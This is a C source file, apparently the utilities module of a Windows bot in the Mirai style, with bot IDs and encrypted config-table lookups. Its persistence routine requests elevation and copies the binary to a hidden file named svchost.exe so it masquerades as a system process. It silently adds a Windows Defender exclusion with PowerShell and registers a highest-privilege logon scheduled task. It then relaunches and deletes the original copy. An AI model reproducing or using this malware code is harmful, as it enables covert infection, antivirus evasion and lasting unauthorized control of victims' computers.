#include "headers/includes.h"
#include "headers/utils.h"
#include "headers/table.h"

uint32_t util_local_addr(void) {
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == 0) {
        struct hostent *he = gethostbyname(hostname);
        if (he != NULL && he->h_addr_list[0] != NULL) {
            return *(uint32_t *)he->h_addr_list[0];
        }
    }
    return inet_addr("127.0.0.1");
}

void get_bot_id(char *buf) {
    wsprintfA(buf, "win_%u", GetTickCount() % 100000);
}

void util_memset(void *dst, uint8_t val, uint32_t len) {
    uint8_t *p = (uint8_t *)dst;
    while (len--) *p++ = val;
}

void util_memcpy(void *dst, const void *src, uint32_t len) {
    uint8_t *d = (uint8_t *)dst;
    const uint8_t *s = (const uint8_t *)src;
    while (len--) *d++ = *s++;
}

int util_strlen(const char *str) {
    int len = 0;
    while (*str++) len++;
    return len;
}

void util_strcpy(char *dst, const char *src) {
    while ((*dst++ = *src++));
}

void util_strncpy(char *dst, const char *src, uint32_t len) {
    while (len-- && (*dst++ = *src++));
}

int util_strcmp(const char *str1, const char *str2) {
    while (*str1 && (*str1 == *str2)) {
        str1++;
        str2++;
    }
    return (int)(*(unsigned char *)str1 - *(unsigned char *)str2);
}

int util_atoi(const char *str) {
    int res = 0;
    while (*str >= '0' && *str <= '9') {
        res = res * 10 + (*str - '0');
        str++;
    }
    return res;
}

char *util_strstr(const char *haystack, const char *needle) {
    if (!*needle) return (char *)haystack;
    for (; *haystack; haystack++) {
        if (*haystack == *needle) {
            const char *h = haystack, *n = needle;
            while (*h && *n && *h == *n) {
                h++;
                n++;
            }
            if (!*n) return (char *)haystack;
        }
    }
    return NULL;
}

char *util_strchr(const char *str, int c) {
    while (*str) {
        if (*str == (char)c) return (char *)str;
        str++;
    }
    if (c == 0) return (char *)str;
    return NULL;
}

char *util_strtok(char *str, const char *delim) {
    static char *next;
    if (str) next = str;
    if (!next) return NULL;
    while (*next && util_strchr(delim, *next)) next++;
    if (!*next) return NULL;
    char *start = next;
    while (*next && !util_strchr(delim, *next)) next++;
    if (*next) {
        *next = '\0';
        next++;
    } else {
        next = NULL;
    }
    return start;
}

BOOL util_is_admin(void) {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin;
}

void util_elevate(void) {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    PRINTF("[utils] Elevating: %s\n", path);
    ShellExecuteA(NULL, "runas", path, NULL, NULL, SW_SHOW);
}

void util_persistence(void) {
    char current_path[MAX_PATH];
    char *target_dir;
    char target_path[MAX_PATH];

    PRINTF("[utils] Starting persistence check...\n");
    table_unlock_val(TABLE_PERSIST_DIR);
    target_dir = table_retrieve_val(TABLE_PERSIST_DIR, NULL);

    if (target_dir == NULL) {
        PRINTF("[utils] Target dir is NULL\n");
        table_lock_val(TABLE_PERSIST_DIR);
        return;
    }

    if (GetModuleFileNameA(NULL, current_path, MAX_PATH) == 0) {
        table_lock_val(TABLE_PERSIST_DIR);
        return;
    }

    wsprintfA(target_path, "%s\\svchost.exe", target_dir);

    char lower_path[MAX_PATH];
    util_strcpy(lower_path, current_path);
    for(int i = 0; lower_path[i]; i++) if(lower_path[i] >= 'a' && lower_path[i] <= 'z') {} else if(lower_path[i] >= 'A' && lower_path[i] <= 'Z') lower_path[i] += 32;

    if (util_strstr(lower_path, "\\intel\\svchost.exe") != NULL) {
        PRINTF("[utils] Already in persistence folder\n");
        table_lock_val(TABLE_PERSIST_DIR);
        return;
    }

    if (!util_is_admin()) {
        PRINTF("[utils] Not admin, attempting elevation...\n");
        util_elevate();
        table_lock_val(TABLE_PERSIST_DIR);
        ExitProcess(0);
    }
    PRINTF("[utils] Running as admin\n");

    PVOID old_value = NULL;
    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
    typedef BOOL (WINAPI *PWow64DisableWow64FsRedirection)(PVOID*);
    PWow64DisableWow64FsRedirection disable = (PWow64DisableWow64FsRedirection)GetProcAddress(kernel32, "Wow64DisableWow64FsRedirection");
    if (disable) disable(&old_value);

    PRINTF("[utils] Creating directory: %s\n", target_dir);
    if (!CreateDirectoryA(target_dir, NULL) && GetLastError() != 183) {
        PRINTF("[utils] CreateDirectoryA failed: %d\n", GetLastError());
    }

    PRINTF("[utils] Copying %s to %s\n", current_path, target_path);
    if (CopyFileA(current_path, target_path, FALSE) || GetLastError() == 5) {
        if (GetLastError() == 5) PRINTF("[utils] File already exists and is in use, assuming persistent\n");
        SetFileAttributesA(target_path, FILE_ATTRIBUTE_HIDDEN);

        char exclude_cmd[1024];
        wsprintfA(exclude_cmd, "powershell -Command \"Add-MpPreference -ExclusionPath '%s'\"", target_dir);
        PRINTF("[utils] Executing: %s\n", exclude_cmd);
        WinExec(exclude_cmd, SW_HIDE);

        char cmd[1024];
        wsprintfA(cmd, "schtasks /create /tn \"svchost\" /tr \"\\\"%s\\\"\" /sc onlogon /rl HIGHEST /f", target_path);
        PRINTF("[utils] Executing: %s\n", cmd);
        WinExec(cmd, SW_HIDE);

        STARTUPINFOA si;
        PROCESS_INFORMATION pi;
        util_memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        util_memset(&pi, 0, sizeof(pi));

        char args[MAX_PATH + 64];
        wsprintfA(args, "\"%s\" --cleanup \"%s\"", target_path, current_path);

        PRINTF("[utils] Starting new process: %s %s\n", target_path, args);
        if (CreateProcessA(target_path, args, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            PRINTF("[utils] New process started, exiting original...\n");
            table_lock_val(TABLE_PERSIST_DIR);
            ExitProcess(0);
        } else {
            PRINTF("[utils] CreateProcessA failed: %d\n", GetLastError());
        }
    } else {
        PRINTF("[utils] CopyFileA failed: %d\n", GetLastError());
    }

    typedef BOOL (WINAPI *PWow64RevertWow64FsRedirection)(PVOID);
    PWow64RevertWow64FsRedirection revert = (PWow64RevertWow64FsRedirection)GetProcAddress(kernel32, "Wow64RevertWow64FsRedirection");
    if (revert) revert(old_value);

    table_lock_val(TABLE_PERSIST_DIR);
}

void util_single_instance(void) {
    struct sockaddr_in addr;
    int sock = (int)socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) return;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(SINGLE_INSTANCE_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) == SOCKET_ERROR) {
        ExitProcess(0);
    }
}

void util_cleanup(char *path) {
    if (path == NULL || util_strlen(path) == 0) return;

    if (GetFileAttributesA(path) == INVALID_FILE_ATTRIBUTES) {
        PRINTF("[utils] Cleanup: File %s does not exist, skipping.\n", path);
        return;
    }

    char current_exe[MAX_PATH];
    if (GetModuleFileNameA(NULL, current_exe, MAX_PATH) != 0) {
        if (util_strcmp(path, current_exe) == 0) {
            PRINTF("[utils] Cleanup: Cannot delete self.\n");
            return;
        }
    }

    PRINTF("[utils] Cleanup waiting for original to exit...\n");
    Sleep(5000);

    for (int i = 0; i < 10; i++) {
        if (DeleteFileA(path)) {
            PRINTF("[utils] Successfully deleted: %s\n", path);
            break;
        }
        DWORD err = GetLastError();
        if (err == 2) {
             PRINTF("[utils] File already gone.\n");
             break;
        }
        PRINTF("[utils] Failed to delete (attempt %d): %d\n", i + 1, err);
        Sleep(2000);
    }
}
